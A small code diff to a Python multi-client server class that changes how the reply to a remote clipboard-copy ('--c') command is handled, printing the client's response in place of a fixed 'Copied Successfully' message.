@@ -418,8 +418,7 @@ class MultiServer(object):
         if '--c' in command:
             text_to_copy = input('Text to copy: ')
             self.send(conn, json_dumps(['--c', text_to_copy]))
-            self.receive(conn, _print=False)
-            print('Copied Successfully')
+            self.receive(conn)
             return
         if '--u' in command:
             self.send(conn, json_dumps(['--u']))
